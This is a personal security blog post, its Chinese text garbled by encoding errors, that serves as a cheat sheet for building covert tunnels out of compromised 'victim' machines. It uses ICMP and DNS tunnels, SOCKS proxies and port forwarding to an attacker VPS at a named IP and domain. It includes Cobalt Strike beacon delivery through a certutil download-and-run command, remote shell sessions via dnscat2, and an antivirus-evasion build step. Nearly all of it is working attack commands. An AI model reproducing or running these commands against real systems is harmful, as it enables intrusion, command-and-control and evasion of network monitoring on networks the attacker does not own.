---
title: å†…ç½‘éš§é“æ­å»º
date: 2023-01-11 15:11:40 +0800
categories: 
tags: 
permalink: /posts/id=79/
pin: false
---
## ICMPéš§é“
```shell
# VPS
sudo ./pingtunnel -type server -key 000000


# å—å®³æœº
pingtunnel.exe -type client -l 127.0.0.1:2222 -s 150.158.144.112 -t 150.158.144.112:3333 -tcp 1  -key 000000

# å»ºç«‹éš§é“ä»å—å®³æœºçš„2222ç«¯å£åˆ°VPSçš„3333ç«¯å£ï¼Œéš§é“å†…é€šè¿‡ICMPä¼ è¾“


# æ¥å…¥CS
CSğŸè®¾ç½®ä¸ºåå¼¹åˆ°å—å®³æœº2222ç«¯å£ï¼Œè¿™æ ·å°±èƒ½é€šè¿‡éš§é“ä¼ å›shell
åˆ›å»º2ä¸ªç›‘å¬å™¨icmp_port/cs_portï¼Œç”Ÿæˆä¸€ä¸ªåå¼¹åˆ°å—å®³æœº2222ç«¯å£çš„beacon
å—å®³æœºæ‰§è¡Œbeacon.exeå³å¯ä¸Šçº¿


# è¿›ä¸€æ­¥å¯ä»¥å®ç°å†…ç½‘ç©¿é€(ä»»æ„ä½¿ç”¨å…¬å¸å†…ç½‘)
çœç•¥ æ­å»ºICMP TCPéš§é“
# å—å®³æœº å°†å—å®³æœºçš„ç½‘ç»œç¯å¢ƒsocks5ä»£ç†åˆ°å—å®³æœº2222ç«¯å£ï¼Œ2222æ˜¯éš§é“å…¥å£ï¼Œiox ä»£ç†çš„ Socks æµé‡å°†é€šè¿‡ ICMP éš§é“å‡ºç½‘
.\iox.exe proxy -r 127.0.0.1:2222  #å…ˆæ“ä½œ


# VPS å°†VPS3333ç«¯å£æ”¶åˆ°çš„æµé‡è½¬å‘åˆ°4444ç«¯å£
./iox proxy -l 3333 -l 4444

# é€šè¿‡ proxifier ä»£ç† socks æµé‡ï¼Œ VPS4444ç«¯å£  å®ç°æœ¬æœºè®¿é—®å†…ç½‘

# tips


# -noprint 1 -nolog 1

#pingtunnel.exe -type client -l :[è½¬å‘æœ¬æœº2222ç«¯å£ä½œä¸ºICMPéš§é“é€šè®¯ç«¯å£] -s [æœåŠ¡ç«¯IP] -[è½¬å‘ç±»å‹] 1 -noprint 1 -nolog 1
```


## DNSéš§é“æ­å»º

```shell
# é…ç½®åŸŸåè§£æ
ns1 A 150.158.144.112
log ns ns1.e4l4.com
# å¼€å¯VPS TCP UDP 53ç«¯å£æ”¾è¡Œ
# test  VPS:sudo tcpdump -n -i eth0 udp dst port 53   å—å®³æœºï¼šnslookup log.e4l4.com

# å…³é—­DNSè§£ææœåŠ¡
sudo service systemd-resolved stop
# sudo service systemd-resolved start
sudo ruby dnscat2.rb log.e4l4.com -c 000000

.\dnscat2-v0.07-client-win32.exe --secret=000000 log.e4l4.com --delay 5000



# æ¥CS
# å»ºç«‹DNSéš§é“ï¼ŒåŒæ—¶è·å–shell
# VPSç«¯
sudo ruby ./dnscat2.rb log.e4l4.com -e open -c 000000 --no-cache
# å—å®³è€…ç«¯
.\dnscat2-v0.07-client-win32.exe --secret=000000 log.e4l4.com --delay 5000

# VPSç«¯
session -i 1
shell //è·å–çœŸshell
session -i 2 

# æŠŠç”Ÿæˆçš„beacon.exe(åå¼¹åˆ°VPS3333ç«¯å£)æ”¾åˆ°VPSä¸Šï¼Œç”¨pythonå¼€http
python3 -m http.server 4444
# åœ¨å·²æœ‰çš„shellé‡Œä¸‹è½½
certutil.exe -urlcache -split -f http://e4l4.com:4444/beacon_x64.exe C:\Users\Public\beacon.exe

C:\Users\Public\beacon.exe
```

## sshéš§é“ï¼ˆçº¯å†…ç½‘ç›®æ ‡æœºï¼‰

éœ€è¦è·³æ¿æœº

```shell
# VPSå¢åŠ sshç«¯å£è½¬å‘
sudo vim /etc/ssh/sshd_config

GatewayPorts noæ”¹æˆyes

sudo systemctl restart sshd.service
```


## vpnéš§é“

### csè‡ªå¸¦çš„vpnéš§é“

ä¼¼ä¹åªèƒ½å·¥ä½œåœ¨windows server ä¸Š
æ“ä½œæ–‡ç« ï¼š
https://xz.aliyun.com/t/12500?time__1311=mqmhD50IZD8D%2FD0lD2DUo4fobK%3D0Q5F%3DF4D&alichlgref=https%3A%2F%2Fwww.google.com.hk%2F#toc-2

### Openvpn

## Socksä»£ç†
æœ‰socks4å’Œ5ä¸¤ç§ç±»å‹ï¼Œsocks4åªæ”¯æŒTCPåè®®è€Œsocks 5æ”¯æŒTCP/UDPåè®®ï¼Œè¿˜æ”¯æŒå„ç§èº«ä»½è®¤è¯æœºåˆ¶ç­‰åè®®

Iox
```bash
# VPS
./iox proxy -l 9999 -l 3333

# å—å®³æœº
iox.exe proxy -r e4l4.com:9999


è¿æ¥e4l4.com:3333å³å¯
```


Frp 
frpså®Œæ•´é…ç½®ï¼šhttps://github.com/fatedier/frp/blob/dev/conf/frps_full_example.toml
frpcå®Œæ•´é…ç½®ï¼šhttps://github.com/fatedier/frp/blob/dev/conf/frpc_full_example.toml
```bash
# VPS ç»‘å®šIPé»˜è®¤ä¸ºæœ¬æœºï¼Œç›‘å¬7000ç«¯å£
nohup ./frps -c frps.toml >/dev/null 2>&1 &
# frps.toml
bindPort = 7000
# å—å®³æœº
nohup ./frpc -c frpc.toml >/dev/null 2>&1 &
# frpc.toml
serverAddr = "150.158.144.112"
serverPort = 7000
# æ·»åŠ çš„Socks5ä»£ç†é…ç½®
[[proxies]]
name = "socks5_proxy"  # Socks5ä»£ç†çš„åç§°
type = "tcp"
remotePort = 3333      # Socks5ä»£ç†çš„è¿œç¨‹ç«¯å£ï¼Œå¯ä»¥æ ¹æ®éœ€è¦æ›´æ”¹
plugin = "socks5"
# plugin_user = "your_username"  # å¦‚æœéœ€è¦ç”¨æˆ·åå’Œå¯†ç è®¤è¯ï¼Œå–æ¶ˆè¿™ä¸¤è¡Œçš„æ³¨é‡Šå¹¶è®¾ç½®ç”¨æˆ·åå’Œå¯†ç 
# plugin_passwd = "your_password"

è¿æ¥e4l4.com:3333å³å¯
```


## Slcxç«¯å£è½¬å‘(ioxå¹³æ›¿)

```shell
# å…æ€ç¼–è¯‘
# windowsç«¯
# å¯ä¿®æ”¹æ–‡ä»¶é‡Œçš„å¯†é’¥
$env:GOOS="windows"; $env:GOARCH="amd64"; go build -ldflags="-s -w" -o e4l4.exe


go build -ldflags="-s -w" -o 



# VPSç«¯ å°†å—å®³æœºå‘é€åˆ°4443çš„æµé‡è½¬å‘åˆ°4444ç«¯å£
./slcx :4443 0.0.0.0:4444 --laoban


# å°†å—å®³æœ¬æœºçš„22ç«¯å£è½¬å‘åˆ°VPSä¸Šçš„4443ç«¯å£
.\slcx.exe 127.0.0.1:22 150.158.144.112:4443 --niuma
```












